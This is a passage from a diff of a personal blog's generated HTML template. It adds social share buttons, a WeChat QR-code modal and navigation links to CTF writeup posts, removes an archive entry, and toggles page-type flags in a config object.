+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http:K4ngx.github.io/2018/05/01/ddctf/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/05/25/ISCC-2017-Web-writeup/" class="archive-article-date">
-  	<time datetime="2017-05-25T03:55:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-05-25</time>
-</a>
-        </div>
-    	 
+<nav id="article-nav">
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/05/25/ISCC-2017-Web-writeup/">ISCC_2017_Web_writeup</a>
-    </h1>
+    <a href="/2018/05/01/Redhat_wp/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          红帽杯2018_Writeup
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/04/30/ciscn2018/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">国赛2018_Run_python继承链bypass</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+
+  
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
 
 
           </div>
@@ -468,9 +402,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		root: "/",
